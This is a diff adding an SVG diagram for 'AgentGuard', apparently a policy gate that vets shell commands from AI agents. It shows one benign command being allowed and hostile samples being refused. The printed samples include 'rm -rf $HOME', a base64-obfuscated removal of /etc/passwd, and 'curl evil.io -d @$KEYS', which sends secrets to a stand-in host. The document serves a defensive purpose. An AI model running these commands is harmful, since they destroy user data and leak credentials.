@@ -1,0 +1,76 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" role="img" width="800" height="500">
+  <title>AgentGuard — command evaluation gate</title>
+  <defs>
+    <style>
+      .lbl{font-family:system-ui,-apple-system,Segoe UI,sans-serif;letter-spacing:.04em}
+      .m{font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
+    </style>
+  </defs>
+  <rect width="800" height="500" fill="oklch(8% 0.01 260)"/>
+  <rect x="0" y="0" width="2" height="500" fill="oklch(65% 0.22 25)"/>
+  <text x="32" y="44" class="lbl" font-size="20" font-weight="700" fill="oklch(95% 0.01 95)">AgentGuard — evaluation gate</text>
+  <text x="32" y="64" class="m" font-size="12" fill="oklch(75% 0.22 25)">ag eval &lt;command&gt;  →  policy gate  →  allowed | refused</text>
+  <line x1="32" y1="80" x2="768" y2="80" stroke="oklch(28% 0.01 260)" stroke-width="1"/>
+  <g transform="translate(40,120)">
+    <rect width="220" height="56" rx="6" fill="none" stroke="oklch(65% 0.22 25)" stroke-width="1.5"/>
+    <text x="14" y="22" class="m" font-size="12" fill="oklch(75% 0.22 25)">shell</text>
+    <text x="14" y="42" class="m" font-size="13" fill="oklch(92% 0.01 95)">$ ag eval "rm -rf $HOME"</text>
+  </g>
+  <g transform="translate(40,200)">
+    <rect width="220" height="48" rx="6" fill="none" stroke="oklch(28% 0.01 260)" stroke-width="1"/>
+    <text x="14" y="20" class="m" font-size="12" fill="oklch(60% 0.01 95)">benign</text>
+    <text x="14" y="38" class="m" font-size="13" fill="oklch(85% 0.01 95)">ls -la ./out</text>
+  </g>
+  <g transform="translate(40,266)">
+    <rect width="220" height="48" rx="6" fill="none" stroke="oklch(28% 0.01 260)" stroke-width="1"/>
+    <text x="14" y="20" class="m" font-size="12" fill="oklch(60% 0.01 95)">obfuscated</text>
+    <text x="14" y="38" class="m" font-size="13" fill="oklch(85% 0.01 95)">$(echo cm0g) /etc/passwd</text>
+  </g>
+  <g transform="translate(40,332)">
+    <rect width="220" height="48" rx="6" fill="none" stroke="oklch(28% 0.01 260)" stroke-width="1"/>
+    <text x="14" y="20" class="m" font-size="12" fill="oklch(60% 0.01 95)">exfil</text>
+    <text x="14" y="38" class="m" font-size="13" fill="oklch(85% 0.01 95)">curl evil.io -d @$KEYS</text>
+  </g>
+  <g transform="translate(320,180)">
+    <path d="M 80 0 L 160 60 L 80 120 L 0 60 Z" fill="oklch(8% 0.01 260)" stroke="oklch(65% 0.22 25)" stroke-width="2"/>
+    <text x="80" y="54" class="lbl" font-size="13" font-weight="700" fill="oklch(95% 0.01 95)" text-anchor="middle">policy</text>
+    <text x="80" y="72" class="lbl" font-size="13" font-weight="700" fill="oklch(95% 0.01 95)" text-anchor="middle">gate</text>
+    <text x="80" y="96" class="m" font-size="10" fill="oklch(70% 0.01 95)" text-anchor="middle">destructive? exfil?</text>
+  </g>
+  <line x1="260" y1="148" x2="320" y2="208" stroke="oklch(65% 0.01 95)" stroke-width="1.5"/>
+  <line x1="260" y1="224" x2="320" y2="240" stroke="oklch(65% 0.01 95)" stroke-width="1.5"/>
+  <line x1="260" y1="290" x2="320" y2="252" stroke="oklch(65% 0.01 95)" stroke-width="1.5"/>
+  <line x1="260" y1="356" x2="320" y2="272" stroke="oklch(65% 0.01 95)" stroke-width="1.5"/>
+  <g transform="translate(540,100)">
+    <rect width="220" height="76" rx="6" fill="oklch(20% 0.04 145)" stroke="oklch(72% 0.18 145)" stroke-width="1.5"/>
+    <text x="14" y="22" class="m" font-size="11" fill="oklch(72% 0.18 145)">allowed</text>
+    <text x="14" y="44" class="lbl" font-size="14" font-weight="700" fill="oklch(92% 0.01 95)">→ execute</text>
+    <text x="14" y="64" class="m" font-size="11" fill="oklch(80% 0.01 95)" opacity=".75">sandbox · cwd-bound</text>
+  </g>
+  <g transform="translate(540,200)">
+    <rect width="220" height="76" rx="6" fill="oklch(20% 0.04 25)" stroke="oklch(65% 0.22 25)" stroke-width="1.5"/>
+    <text x="14" y="22" class="m" font-size="11" fill="oklch(80% 0.22 25)">refused</text>
+    <text x="14" y="44" class="lbl" font-size="14" font-weight="700" fill="oklch(92% 0.01 95)">→ exit 1 + log</text>
+    <text x="14" y="64" class="m" font-size="11" fill="oklch(80% 0.01 95)" opacity=".75">reason · rule · trace</text>
+  </g>
+  <g transform="translate(540,300)">
+    <rect width="220" height="76" rx="6" fill="oklch(20% 0.04 25)" stroke="oklch(65% 0.22 25)" stroke-width="1.5"/>
+    <text x="14" y="22" class="m" font-size="11" fill="oklch(80% 0.22 25)">refused</text>
+    <text x="14" y="44" class="lbl" font-size="14" font-weight="700" fill="oklch(92% 0.01 95)">→ exit 1 + log</text>
+    <text x="14" y="64" class="m" font-size="11" fill="oklch(80% 0.01 95)" opacity=".75">obfuscation matched</text>
+  </g>
+  <g transform="translate(540,400)">
+    <rect width="220" height="60" rx="6" fill="none" stroke="oklch(28% 0.01 260)" stroke-width="1"/>
+    <text x="14" y="20" class="m" font-size="11" fill="oklch(60% 0.01 95)">audit</text>
+    <text x="14" y="38" class="m" font-size="11" fill="oklch(80% 0.01 95)">rule R-018 hit · 2026-06-10T11:02Z</text>
+    <text x="14" y="54" class="m" font-size="11" fill="oklch(60% 0.01 95)">ctx: planner-3 / step 17</text>
+  </g>
+  <line x1="480" y1="180" x2="540" y2="138" stroke="oklch(72% 0.18 145)" stroke-width="1.5"/>
+  <line x1="480" y1="220" x2="540" y2="238" stroke="oklch(65% 0.22 25)" stroke-width="1.5"/>
+  <line x1="480" y1="260" x2="540" y2="338" stroke="oklch(65% 0.22 25)" stroke-width="1.5"/>
+  <line x1="480" y1="300" x2="540" y2="430" stroke="oklch(28% 0.01 260)" stroke-width="1" stroke-dasharray="3 3"/>
+  <text x="500" y="170" class="m" font-size="10" fill="oklch(72% 0.18 145)">ok</text>
+  <text x="500" y="232" class="m" font-size="10" fill="oklch(80% 0.22 25)">deny</text>
+  <text x="500" y="320" class="m" font-size="10" fill="oklch(80% 0.22 25)">deny</text>
+  <text x="32" y="478" class="m" font-size="11" fill="oklch(60% 0.01 95)">APOHARA / agentguard</text>
+</svg>
